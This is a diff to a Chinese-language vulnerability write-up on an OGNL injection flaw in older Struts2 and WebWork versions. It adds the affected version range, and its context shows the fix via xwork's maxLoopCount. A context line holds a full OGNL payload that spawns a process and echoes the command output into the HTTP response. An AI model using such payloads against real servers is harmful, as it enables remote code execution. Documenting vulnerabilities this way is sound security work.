@@ -44,6 +44,10 @@
 %{#a=(new java.lang.ProcessBuilder(new java.lang.String[]{"cmd","-c","clac"})).redirectErrorStream(true).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#f=#context.get("com.opensymphony.xwork2.dispatcher.HttpServletResponse"),#f.getWriter().println(new java.lang.String(#e)),#f.getWriter().flush(),#f.getWriter().close()}
 ```
 
+## 漏洞影响范围
+
+WebWork 2.2.0-WebWork 2.2.5，Struts 2.0.0-Struts 2.0.8
+
 ## 漏洞修复
 
 在 `xwork 2.0.4` 中添加了一个maxLoopCount属性，限制了递归解析的最大数目。
